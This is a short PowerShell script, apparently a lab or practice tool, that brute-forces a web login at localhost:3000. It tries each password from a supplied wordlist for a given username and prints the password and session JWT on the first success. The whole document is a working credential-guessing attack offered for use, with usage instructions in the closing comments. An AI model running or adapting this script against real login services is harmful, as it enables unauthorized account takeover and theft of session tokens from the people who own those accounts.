$passwords = Get-Content $args[0]

for ($i = 0; $i -lt $passwords.Length; $i++) {
    $pass = $passwords[$i].Trim()
    $body = @{username=$args[1]; password=$pass} | ConvertTo-Json -Compress

    try{
        $response = Invoke-WebRequest -Uri "http://localhost:3000/login" `
            -Method Post `
            -Headers @{"Content-Type"="application/json"} `
            -Body $body -SessionVariable session -ErrorAction Stop
    } catch{
        continue
    }

    if ($response.StatusCode -eq 200) {
        $jwt = $session.Cookies.GetCookies("http://localhost:3000") | Where-Object { $_.Name -eq "jwt" } | Select-Object -ExpandProperty Value
        if ($jwt) {
            Write-Output "$pass : $jwt"
        } 
        break
    }
}

# use this script like: ./jwtBrute.ps1 "\path\to\wordlist" "username"

# the script brute forces the login page until it enters the correct password and retrieves the token
# the output will be: password : jwt
